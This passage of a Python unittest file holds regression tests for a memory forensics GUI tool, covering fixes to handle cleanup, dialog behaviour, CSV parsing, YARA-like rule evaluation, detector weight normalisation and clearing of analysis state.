        self.assertGreater(score, 0, "Malicious port on external IP should be detected")

    def test_empty_and_star_addresses(self):
        """Edge case addresses should return safely."""
        gui = self._make_gui()
        self.assertEqual(gui._check_suspicious_connection('*:*', 'TCP'), (False, "", 0))
        self.assertEqual(gui._check_suspicious_connection('0.0.0.0:0', 'TCP'), (False, "", 0))
        self.assertEqual(gui._check_suspicious_connection('', 'TCP'), (False, "", 0))


class TestBug25HandleCleanup(unittest.TestCase):
    """Bug 25: Handle cleanup used truthiness check that fails for handle value 0."""

    def test_handle_cleanup_uses_is_not_none(self):
        """Handle cleanup should use 'is not None' not truthiness check."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._create_dump_with_api)
        self.assertIn('is not None', source, "Handle cleanup should use 'is not None'")
        # Should NOT have bare 'if file_handle and' pattern
        self.assertNotIn('if file_handle and file_handle != -1:', source,
                        "Should not use bare truthiness check for handles")


# ═══════════════════════════════════════════════════════════════
#  BUG 26-27: grab_release before dialog.destroy
# ═══════════════════════════════════════════════════════════════

class TestBug26_27GrabRelease(unittest.TestCase):
    """Verify grab_release() is called before dialog.destroy() to prevent GUI freeze."""

    def test_acquire_ram_has_grab_release(self):
        """acquire_ram_dump must call grab_release before dialog.destroy."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.acquire_ram_dump)
        self.assertIn('grab_release', source,
                      "acquire_ram_dump must call grab_release()")

    def test_acquire_ram_has_wm_delete_protocol(self):
        """acquire_ram_dump dialog must handle WM_DELETE_WINDOW with grab_release."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.acquire_ram_dump)
        self.assertIn('WM_DELETE_WINDOW', source,
                      "acquire_ram_dump must handle WM_DELETE_WINDOW for clean close")

    def test_create_memory_dump_has_grab_release(self):
        """create_memory_dump must call grab_release before dialog.destroy."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.create_memory_dump)
        self.assertIn('grab_release', source,
                      "create_memory_dump must call grab_release()")

    def test_create_memory_dump_has_wm_delete_protocol(self):
        """create_memory_dump must handle WM_DELETE_WINDOW with grab_release."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.create_memory_dump)
        self.assertIn('WM_DELETE_WINDOW', source,
                      "create_memory_dump must handle WM_DELETE_WINDOW for clean close")


# ═══════════════════════════════════════════════════════════════
#  BUG 28: WMIC CSV parsing must use csv.reader
# ═══════════════════════════════════════════════════════════════

class TestBug28WMICCSVParsing(unittest.TestCase):
    """WMIC CSV output must be parsed with csv.reader, not split(',')."""

    def test_get_process_details_uses_csv_reader(self):
        """_get_process_details must use csv.reader for WMIC CSV output."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._get_process_details)
        self.assertIn('csv.reader', source,
                      "_get_process_details must use csv.reader, not split(',')")
        self.assertNotIn(".split(',')", source,
                        "_get_process_details must not use split(',') for CSV parsing")

    def test_csv_reader_handles_commas_in_command_line(self):
        """csv.reader should correctly parse quoted fields with commas."""
        import csv
        # Simulated WMIC CSV output: entire command line field is quoted
        line = 'MYPC,"C:\\Program Files\\app.exe -flag a,b,c",42,1234,8'
        parsed = list(csv.reader([line]))
        self.assertEqual(len(parsed), 1)
        parts = parsed[0]
        self.assertEqual(parts[0], 'MYPC')
        # csv.reader correctly handles the quoted field with internal commas
        self.assertIn('app.exe', parts[1])
        self.assertIn('a,b,c', parts[1])
        # HandleCount, ParentProcessId, ThreadCount should be correct
        self.assertEqual(parts[2], '42')
        self.assertEqual(parts[3], '1234')
        self.assertEqual(parts[4], '8')

    def test_create_memory_dump_wmic_uses_csv_reader(self):
        """Process list in create_memory_dump must use csv.reader."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.create_memory_dump)
        self.assertIn('csv.reader', source,
                      "create_memory_dump process list must use csv.reader")


# ═══════════════════════════════════════════════════════════════
#  BUG 29: Volatility dialog widget access after destroy
# ═══════════════════════════════════════════════════════════════

class TestBug29VolatilityDialogSafety(unittest.TestCase):
    """Volatility dialog must check widget existence before updating."""

    def test_volatility_dialog_checks_winfo_exists(self):
        """Background thread callbacks must check dialog.winfo_exists()."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._volatility_analysis_dialog)
        self.assertIn('winfo_exists', source,
                      "_volatility_analysis_dialog must check winfo_exists() before widget updates")

    def test_volatility_dialog_catches_tcl_error(self):
        """Background thread callbacks must catch TclError for destroyed widgets."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._volatility_analysis_dialog)
        self.assertIn('TclError', source,
                      "_volatility_analysis_dialog must catch TclError from destroyed widgets")


# ═══════════════════════════════════════════════════════════════
#  BUG 30: clear_all must clear all treeviews
# ═══════════════════════════════════════════════════════════════

class TestBug30ClearAllTreeviews(unittest.TestCase):
    """clear_all() must clear all treeview widgets, not just text/labels."""

    def _get_clear_all_source(self):
        from memory_forensics_tool import MemoryForensicsGUI
        return inspect.getsource(MemoryForensicsGUI.clear_all)

    def test_clear_all_clears_proc_tree(self):
        """clear_all must clear proc_tree."""
        source = self._get_clear_all_source()
        self.assertIn('proc_tree', source,
                      "clear_all() must clear proc_tree")

    def test_clear_all_clears_net_tree(self):
        """clear_all must clear net_tree."""
        source = self._get_clear_all_source()
        self.assertIn('net_tree', source,
                      "clear_all() must clear net_tree")

    def test_clear_all_clears_malware_tree(self):
        """clear_all must clear malware_tree."""
        source = self._get_clear_all_source()
        self.assertIn('malware_tree', source,
                      "clear_all() must clear malware_tree")

    def test_clear_all_clears_dll_tree(self):
        """clear_all must clear dll_tree."""
        source = self._get_clear_all_source()
        self.assertIn('dll_tree', source,
                      "clear_all() must clear dll_tree")

    def test_clear_all_clears_str_tree(self):
        """clear_all must clear str_tree."""
        source = self._get_clear_all_source()
        self.assertIn('str_tree', source,
                      "clear_all() must clear str_tree")

    def test_clear_all_clears_reg_tree(self):
        """clear_all must clear reg_tree."""
        source = self._get_clear_all_source()
        self.assertIn('reg_tree', source,
                      "clear_all() must clear reg_tree")

    def test_clear_all_clears_entropy_tree(self):
        """clear_all must clear entropy_tree."""
        source = self._get_clear_all_source()
        self.assertIn('entropy_tree', source,
                      "clear_all() must clear entropy_tree")

    def test_clear_all_clears_timeline_tree(self):
        """clear_all must clear timeline_tree."""
        source = self._get_clear_all_source()
        self.assertIn('timeline_tree', source,
                      "clear_all() must clear timeline_tree")


# ═══════════════════════════════════════════════════════════════
#  SUBPROCESS TIMEOUTS
# ═══════════════════════════════════════════════════════════════

class TestSubprocessTimeouts(unittest.TestCase):
    """All subprocess.run calls should have timeout parameters."""

    def test_procdump_where_has_timeout(self):
        """where procdump subprocess call must have timeout."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._try_procdump_fallback)
        # Check that 'timeout' appears (indicating subprocess calls have timeouts)
        self.assertIn('timeout', source,
                      "_try_procdump_fallback must use timeout on subprocess calls")

    def test_create_dump_netstat_has_timeout(self):
        """netstat call in create_memory_dump must have timeout."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.create_memory_dump)
        # Count timeout occurrences - should be present for subprocess calls
        self.assertIn('timeout', source,
                      "create_memory_dump subprocess calls must have timeouts")


# ═══════════════════════════════════════════════════════════════
#  SESSION 11: DEEP REVIEW ROUND 2 BUG REGRESSION TESTS
# ═══════════════════════════════════════════════════════════════

class TestBug31_33EnsembleWeightNormalization(unittest.TestCase):
    """Tests for bugs 31-33: ensemble weights must sum to 1.0."""

    def test_enhanced_process_check_weights_sum_to_1(self):
        """Bug 31: _enhanced_process_check weights must sum to 1.0."""
        source = inspect.getsource(MemoryForensicsEngine)
        # The ensemble calculation uses 0.40 + 0.35 + 0.25 = 1.00
        # Check that the old 0.90 sum is fixed
        self.assertNotIn('score_l1 * 0.35', source,
                         "Old 0.35 weight should be updated to 0.40")

    def test_advanced_ml_detector_weights_sum_to_1(self):
        """Bug 32: AdvancedMLDetector weights must sum to 1.0."""
        detector = AdvancedMLDetector()
        total = sum(detector.weights.values())
        self.assertAlmostEqual(total, 1.0, places=2,
                               msg=f"AdvancedMLDetector weights sum to {total}, not 1.0")

    def test_advanced_ml_detector_no_behavioral_weight(self):
        """Bug 32: 'behavioral' key should be removed (not computed)."""
        detector = AdvancedMLDetector()
        self.assertNotIn('behavioral', detector.weights,
                         "'behavioral' weight exists but is never used in detect()")

    def test_ml_malware_detector_weights_sum_to_1(self):
        """Bug 33: MLMalwareDetector FEATURE_WEIGHTS must sum to 1.0."""
        total = sum(MLMalwareDetector.FEATURE_WEIGHTS.values())
        self.assertAlmostEqual(total, 1.0, places=2,
                               msg=f"FEATURE_WEIGHTS sum to {total}, not 1.0")

    def test_ml_malware_detector_no_phantom_feature(self):
        """Bug 33: 'behavioral_correlation' key should be removed."""
        self.assertNotIn('behavioral_correlation', MLMalwareDetector.FEATURE_WEIGHTS,
                         "'behavioral_correlation' exists but extract_features never produces it")

    def test_ml_malware_detector_all_weights_have_features(self):
        """Verify every FEATURE_WEIGHTS key is actually produced by extract_features."""
        detector = MLMalwareDetector()
        engine = MemoryForensicsEngine()
        engine.load_dump(TEST_DUMP)
        features = detector.extract_features(engine.dump_data[:1024])
        for key in MLMalwareDetector.FEATURE_WEIGHTS:
            self.assertIn(key, features,
                          f"FEATURE_WEIGHTS has '{key}' but extract_features doesn't produce it")


class TestBug34NetstatUDPParsing(unittest.TestCase):
    """Tests for bug 34: netstat UDP connections must not be dropped."""

    def test_get_current_connections_handles_udp(self):
        """Bug 34: _get_current_connections must handle 4-column UDP lines."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._get_current_connections)
        # Verify it checks for UDP with len >= 4 (not just len >= 5)
        self.assertIn('len(parts) >= 4', source,
                      "Netstat parsing must check len >= 4 to include UDP connections")

    def test_get_current_connections_tcp_and_udp_branches(self):
        """Bug 34: must have separate TCP and UDP parsing branches."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._get_current_connections)
        self.assertIn("'TCP'", source,
                      "Must have explicit TCP parsing branch")
        self.assertIn("'UDP'", source,
                      "Must have explicit UDP parsing branch")


class TestBug35StringMinLengthValidation(unittest.TestCase):
    """Tests for bug 35: string extraction must validate min_length."""

    def test_extract_strings_min_length_zero(self):
        """Bug 35: min_length=0 should not hang the application."""
        engine = MemoryForensicsEngine()
        engine.load_dump(TEST_DUMP)
        # min_length of 0 should be clamped to at least 1 at the GUI level
        # At the engine level, even min_length=1 should work without hanging
        result = engine.extract_strings(min_length=1)
        self.assertIsInstance(result, list)

    def test_gui_clamps_min_length(self):
        """Bug 35: GUI extract_strings clamps min_length < 1 to 1."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.extract_strings)
        self.assertIn('min_len < 1', source,
                      "GUI must clamp min_length < 1 to prevent regex hang")


class TestBug36YARADivisionByZero(unittest.TestCase):
    """Tests for bug 36: YARA scan must not divide by zero on empty strings."""

    def test_yara_confidence_no_division_by_zero(self):
        """Bug 36: confidence calc uses max(1, len(strings)) to avoid ZeroDivisionError."""
        source = inspect.getsource(YARALikeEngine.scan)
        self.assertIn("max(1, len(rule['strings']))", source,
                      "YARA confidence must guard against division by zero")

    def test_yara_scan_empty_rule_strings(self):
        """Bug 36: scanning with a rule that has no strings should not crash."""
        engine = YARALikeEngine()
        # Even though built-in rules always have strings, verify the guard works
        test_engine = MemoryForensicsEngine()
        test_engine.load_dump(TEST_DUMP)
        # The scan should work without ZeroDivisionError
        results = engine.scan(test_engine.dump_data)
        self.assertIsInstance(results, list)


class TestBug37LoadDumpClearsState(unittest.TestCase):
    """Tests for bug 37: load_dump must reset analysis state."""

    def test_load_dump_resets_analysis_results(self):
        """Bug 37: loading a new dump must clear old analysis_results."""
        engine = MemoryForensicsEngine()
        engine.load_dump(TEST_DUMP)
        # Simulate stale state
        engine.analysis_results = {'old': 'data'}
        engine.risk_score = 99
        engine.findings = ['stale finding']
        # Load again
        engine.load_dump(TEST_DUMP)
        self.assertEqual(engine.analysis_results, {})
        self.assertEqual(engine.risk_score, 0)
        self.assertEqual(engine.findings, [])

    def test_load_dump_source_has_reset(self):
        """Bug 37: load_dump source must explicitly reset state fields."""
        source = inspect.getsource(MemoryForensicsEngine.load_dump)
        self.assertIn('analysis_results', source,
                      "load_dump must reset analysis_results")
        self.assertIn('risk_score', source,
                      "load_dump must reset risk_score")
        self.assertIn('findings', source,
                      "load_dump must reset findings")


class TestBug38ClearAllCompleteness(unittest.TestCase):
    """Tests for bug 38: clear_all must clear ALL widgets."""

    def test_clear_all_includes_realtime_trees(self):
        """Bug 38: clear_all must include realtime_proc_tree and realtime_net_tree."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('realtime_proc_tree', source,
                      "clear_all must clear realtime_proc_tree")
        self.assertIn('realtime_net_tree', source,
                      "clear_all must clear realtime_net_tree")

    def test_clear_all_clears_dashboard_canvas(self):
        """Bug 38: clear_all must clear threat_canvas."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('threat_canvas', source,
                      "clear_all must clear threat_canvas")

    def test_clear_all_resets_dashboard_metric_cards(self):
        """Bug 38: clear_all must reset dashboard metric cards."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('threat_score_card', source,
                      "clear_all must reset threat_score_card")
        self.assertIn('risk_level_card', source,
                      "clear_all must reset risk_level_card")

    def test_clear_all_resets_behavioral_widgets(self):
        """Bug 38: clear_all must reset behavioral score/level/gauge."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('behavior_score_label', source,
                      "clear_all must reset behavior_score_label")
        self.assertIn('behavior_level_label', source,
                      "clear_all must reset behavior_level_label")
        self.assertIn('behavior_gauge', source,
                      "clear_all must reset behavior_gauge")

    def test_clear_all_clears_mitre_frame(self):
        """Bug 38: clear_all must clear MITRE ATT&CK dynamic labels."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('mitre_frame', source,
                      "clear_all must clear mitre_frame children")

    def test_clear_all_resets_report_summary_labels(self):
        """Bug 38: clear_all must reset report_summary_labels."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('report_summary_labels', source,
                      "clear_all must reset report_summary_labels")

    def test_clear_all_resets_report_findings_frame(self):
        """Bug 38: clear_all must reset report_findings_frame."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('report_findings_frame', source,
                      "clear_all must reset report_findings_frame children")

    def test_clear_all_resets_realtime_state(self):
        """Bug 38: clear_all must reset real-time monitor internal state."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('realtime_alerts', source,
                      "clear_all must reset realtime_alerts")
        self.assertIn('previous_processes', source,
                      "clear_all must reset previous_processes")
        self.assertIn('_process_metrics', source,
                      "clear_all must reset _process_metrics")

    def test_clear_all_clears_info_text(self):
        """Bug 38: clear_all must clear behavior_info_text."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('behavior_info_text', source,
                      "clear_all must clear behavior_info_text")

    def test_clear_all_clears_alert_text(self):
        """Bug 38: clear_all must clear realtime_alert_text."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('realtime_alert_text', source,
                      "clear_all must clear realtime_alert_text")


class TestBug39NegativeOffsetValidation(unittest.TestCase):
    """Tests for bug 39: hex dump and disassemble must clamp negative offsets."""

    def test_hex_dump_negative_offset_clamped(self):
        """Bug 39: hex_dump must clamp negative offset to 0."""
        engine = MemoryForensicsEngine()
        engine.load_dump(TEST_DUMP)
        result = engine.hex_dump(-100, 256)
        # Should return data from offset 0, not from end of dump
        self.assertTrue(result.startswith('00000000'),
                        "Negative offset should be clamped to 0")

    def test_hex_dump_zero_offset(self):
        """Bug 39: hex_dump at offset 0 should work normally."""
        engine = MemoryForensicsEngine()
        engine.load_dump(TEST_DUMP)
        result = engine.hex_dump(0, 16)
        self.assertIn('00000000', result)

    def test_disassemble_source_clamps_offset(self):
        """Bug 39: disassemble_code must clamp offset with max(0, offset)."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.disassemble_code)
        self.assertIn('max(0, offset)', source,
                      "disassemble_code must clamp negative offsets")

    def test_view_hex_source_clamps_offset(self):
        """Bug 39: view_hex must clamp offset with max(0, offset)."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.view_hex)
        self.assertIn('max(0, offset)', source,
                      "view_hex must clamp negative offsets")


class TestBug40ReportGeneratorDumpSize(unittest.TestCase):
    """Tests for bug 40: report generator must handle None dump_size."""

    def test_report_generator_source_handles_none_dump_size(self):
        """Bug 40: report generator must use (dump_size or 0) for None safety."""
        from report_generator import generate_enterprise_html_report
        source = inspect.getsource(generate_enterprise_html_report)
        self.assertIn('dump_size or 0', source,
                      "Report generator must guard against None dump_size")

    def test_report_generator_with_valid_engine(self):
        """Bug 40: report generation works with a properly loaded engine."""
        from report_generator import generate_enterprise_html_report
        engine = MemoryForensicsEngine()
        engine.load_dump(TEST_DUMP)
        html = generate_enterprise_html_report(engine)
        self.assertIsInstance(html, str)
        self.assertIn('html', html.lower())


# ═══════════════════════════════════════════════════════════════
#  SESSION 12: DEEP REVIEW ROUND 3 BUG REGRESSION TESTS
# ═══════════════════════════════════════════════════════════════

class TestBug41SafeAfterAlways(unittest.TestCase):
    """Tests for bug 41: acquisition/Volatility must use _safe_after_always."""

    def test_acquisition_uses_safe_after_always(self):
        """Bug 41: _run_acquisition must use _safe_after_always, not _safe_after."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.acquire_ram_dump)
        # Count _safe_after_always calls (should be many)
        always_count = source.count('_safe_after_always')
        # Count bare _safe_after calls (should be zero in acquisition code)
        bare_count = source.count('._safe_after(')
        self.assertGreater(always_count, 0,
                           "Acquisition must use _safe_after_always for thread callbacks")
        self.assertEqual(bare_count, 0,
                         "Acquisition must not use _safe_after (gated on realtime_monitoring)")

    def test_volatility_uses_safe_after_always(self):
        """Bug 41: Volatility dialog must use _safe_after_always."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._volatility_analysis_dialog)
        always_count = source.count('_safe_after_always')
        bare_count = source.count('._safe_after(')
        self.assertGreater(always_count, 0,
                           "Volatility must use _safe_after_always for thread callbacks")
        self.assertEqual(bare_count, 0,
                         "Volatility must not use _safe_after (gated on realtime_monitoring)")


class TestBug42ReentrancyGuard(unittest.TestCase):
    """Tests for bug 42: run_full_analysis must have re-entrancy guard."""

    def test_run_full_analysis_has_guard(self):
        """Bug 42: run_full_analysis must check _analysis_running flag."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.run_full_analysis)
        self.assertIn('_analysis_running', source,
                      "run_full_analysis must check _analysis_running re-entrancy flag")

    def test_run_full_analysis_resets_flag(self):
        """Bug 42: run_full_analysis must reset flag when complete."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.run_full_analysis)
        self.assertIn('_analysis_running = False', source,
                      "run_full_analysis must reset _analysis_running when done")


class TestBug43ExportErrorHandling(unittest.TestCase):
    """Tests for bug 43: export methods must have try-except."""

    def test_export_json_has_try_except(self):
        """Bug 43: export_json must wrap file I/O in try-except."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.export_json)
        self.assertIn('except', source,
                      "export_json must have exception handling for file I/O")

    def test_export_csv_has_try_except(self):
        """Bug 43: export_csv must wrap file I/O in try-except."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.export_csv)
        self.assertIn('except', source,
                      "export_csv must have exception handling for file I/O")

    def test_volatility_export_has_try_except(self):
        """Bug 43: Volatility export_results must wrap file I/O in try-except."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._volatility_analysis_dialog)
        # The nested export_results function should have try-except
        self.assertIn('Export failed', source,
                      "Volatility export must have error handling")


class TestBug44ClearAllStopsMonitor(unittest.TestCase):
    """Tests for bug 44: clear_all must stop the monitor thread."""

    def test_clear_all_stops_monitoring(self):
        """Bug 44: clear_all must call stop_realtime_monitoring if running."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('stop_realtime_monitoring', source,
                      "clear_all must stop the real-time monitor thread")

    def test_clear_all_resets_analysis_flag(self):
        """Bug 44: clear_all must reset _analysis_running flag."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('_analysis_running', source,
                      "clear_all must reset _analysis_running flag")


class TestBug45ExportEncoding(unittest.TestCase):
    """Tests for bug 45: export_realtime_alerts must use utf-8 encoding."""

    def test_export_alerts_uses_utf8(self):
        """Bug 45: export_realtime_alerts must specify encoding='utf-8'."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.export_realtime_alerts)
        # Both open() calls should have encoding='utf-8'
        open_calls = [line.strip() for line in source.split('\n') if 'open(' in line]
        for call in open_calls:
            self.assertIn('utf-8', call,
                          f"open() call must include encoding='utf-8': {call}")


class TestBug46YARACleanCondition(unittest.TestCase):
    """Tests for bug 46: _clean_condition must handle dangling operators after empty-parens removal."""

    def test_clean_condition_no_dangling_or(self):
        """Bug 46: removing empty parens must not leave dangling 'or' at start."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        # Simulate: (filesize and #var) or any of ($s*)
        # After filesize/#var strip: () or any of ($s*)
        # After fix: should be just "any of ($s*)"
        result = loader._clean_condition('() or any of ($s*)')
        self.assertFalse(result.startswith('or'),
                         f"Dangling 'or' not cleaned: '{result}'")
        self.assertIn('any of', result)

    def test_clean_condition_no_dangling_and(self):
        """Bug 46: removing empty parens must not leave dangling 'and'."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        result = loader._clean_condition('() and any of them')
        self.assertFalse(result.startswith('and'),
                         f"Dangling 'and' not cleaned: '{result}'")

    def test_clean_condition_nested_empty_parens(self):
        """Bug 46: multiple empty parens should all be removed."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        result = loader._clean_condition('() or () or any of them')
        self.assertNotIn('()', result)
        self.assertIn('any of them', result)


class TestBug47YARAVacuousTruth(unittest.TestCase):
    """Tests for bug 47: all-of with no matching prefix vars must return False."""

    def test_all_of_empty_prefix_returns_false(self):
        """Bug 47: all of ($nonexistent*) must return False when no vars have that prefix."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        # all_vars has no 'enc' prefix vars, only 's' prefix
        all_vars = {'s1', 'api1'}
        matched_vars = {'s1'}
        result = loader._eval_compound('all of ($enc*)', matched_vars, all_vars)
        self.assertFalse(result,
                         "all of ($enc*) must return False when no enc* vars exist")

    def test_all_of_with_matching_prefix_works(self):
        """Bug 47: all of ($s*) still works when s-prefix vars exist and are all matched."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        all_vars = {'s1', 's2', 'api1'}
        matched_vars = {'s1', 's2'}
        result = loader._eval_compound('all of ($s*)', matched_vars, all_vars)
        self.assertTrue(result,
                        "all of ($s*) must return True when all s* vars are matched")

    def test_all_of_partial_match_returns_false(self):
        """Bug 47: all of ($s*) returns False when not all s-prefix vars matched."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        all_vars = {'s1', 's2', 'api1'}
        matched_vars = {'s1'}
        result = loader._eval_compound('all of ($s*)', matched_vars, all_vars)
        self.assertFalse(result,
                         "all of ($s*) must return False when not all s* vars matched")


# ═══════════════════════════════════════════════════════════════
#  BUG 48-55 REGRESSION TESTS (Session 13: Deep Review Round 4)
# ═══════════════════════════════════════════════════════════════

class TestBug48LoadDumpInfoFindings(unittest.TestCase):
    """Tests for bug 48: load_dump must reset info_findings."""

    def test_load_dump_resets_info_findings(self):
        """Bug 48: loading new dump must clear stale info_findings."""
        from memory_forensics_tool import MemoryForensicsEngine
        engine = MemoryForensicsEngine()
        engine.info_findings = ['stale_data_from_previous_dump']
        engine.load_dump(os.path.join(os.path.dirname(__file__), 'test_forensic_dump.raw'))
        self.assertEqual(engine.info_findings, [],
                         "load_dump must reset info_findings to empty list")

    def test_load_dump_source_has_info_findings_reset(self):
        """Bug 48: load_dump source must contain info_findings reset."""
        from memory_forensics_tool import MemoryForensicsEngine
        source = inspect.getsource(MemoryForensicsEngine.load_dump)
        self.assertIn('info_findings', source,
                      "load_dump must reset info_findings attribute")


class TestBug49_50ClearAllTextWidgets(unittest.TestCase):
    """Tests for bugs 49-50: clear_all must clear all text widgets."""

    def test_clear_all_includes_disasm_text(self):
        """Bug 49: clear_all must include disasm_text in widget list."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('disasm_text', source,
                      "clear_all must clear disasm_text widget")

    def test_clear_all_includes_ml_report_text(self):
        """Bug 49: clear_all must include ml_report_text in widget list."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('ml_report_text', source,
                      "clear_all must clear ml_report_text widget")

    def test_clear_all_uses_correct_behavioral_name(self):
        """Bug 50: clear_all must use behavior_findings_text not behavioral_text."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('behavior_findings_text', source,
                      "clear_all must use behavior_findings_text (not behavioral_text)")
        self.assertNotIn("'behavioral_text'", source,
                         "clear_all must not reference non-existent behavioral_text")


class TestBug51StatLabelResets(unittest.TestCase):
    """Tests for bug 51: clear_all must reset reg and timeline stat labels."""

    def test_clear_all_resets_reg_stat_labels(self):
        """Bug 51: clear_all must reset registry stat labels."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('reg_stat_labels', source,
                      "clear_all must reset reg_stat_labels")

    def test_clear_all_resets_timeline_stat_labels(self):
        """Bug 51: clear_all must reset timeline stat labels."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('timeline_stat_labels', source,
                      "clear_all must reset timeline_stat_labels")


class TestBug52RealtimeStatLabels(unittest.TestCase):
    """Tests for bug 52: clear_all must reset realtime UI labels."""

    def test_clear_all_resets_realtime_proc_count(self):
        """Bug 52: clear_all must reset realtime_proc_count label."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('realtime_proc_count', source,
                      "clear_all must reset realtime_proc_count label")

    def test_clear_all_resets_realtime_net_count(self):
        """Bug 52: clear_all must reset realtime_net_count label."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('realtime_net_count', source,
                      "clear_all must reset realtime_net_count label")


class TestBug53TimelineTypesFrame(unittest.TestCase):
    """Tests for bug 53: clear_all must reset timeline_types_frame."""

    def test_clear_all_resets_timeline_types_frame(self):
        """Bug 53: clear_all must clear timeline_types_frame children."""
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.clear_all)
        self.assertIn('timeline_types_frame', source,
                      "clear_all must reset timeline_types_frame")


class TestBug54ChiSquare(unittest.TestCase):
    """Tests for bug 54: chi-square must iterate all 256 byte values."""

    def test_chi_square_includes_zero_count_bytes(self):
        """Bug 54: chi-square must include bytes with zero count."""
        from memory_forensics_tool import MLMalwareDetector
        source = inspect.getsource(MLMalwareDetector._analyze_byte_distribution)
        self.assertIn('range(256)', source,
                      "Chi-square must iterate over all 256 byte values, not just present ones")

    def test_chi_square_sparse_data_higher_than_dense(self):
        """Bug 54: sparse data (few unique bytes) should have higher chi-square anomaly."""
        from memory_forensics_tool import MLMalwareDetector
        det = MLMalwareDetector()
        # Sparse data: only 2 unique bytes
        sparse = bytes([0, 1] * 2000)
        # Dense data: many unique bytes (more uniform)
        dense = bytes(range(256)) * 16
        sparse_result = det._analyze_byte_distribution(sparse)
        dense_result = det._analyze_byte_distribution(dense)
        self.assertGreater(sparse_result['anomaly_score'], dense_result['anomaly_score'],
                           "Sparse data should have higher anomaly than uniform data")


class TestBug55EntropyBarWidth(unittest.TestCase):
    """Tests for bug 55: entropy bar width must not exceed 100%."""

    def test_entropy_bar_capped_at_100(self):
